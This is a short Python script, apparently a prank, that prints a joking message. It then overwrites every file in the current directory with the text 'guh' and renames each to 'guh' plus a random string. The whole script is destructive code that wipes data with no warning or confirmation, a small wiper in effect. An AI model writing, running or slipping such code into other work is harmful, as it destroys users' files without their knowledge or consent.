import random
import string
import os


print("im gonna guh..")
used_ids = []
for dir in os.listdir():
    id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    while id in used_ids:
        id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    used_ids.append(id)
    with open(dir, 'w') as file:
        file.write("guh")
    os.rename(dir, f"guh{id}")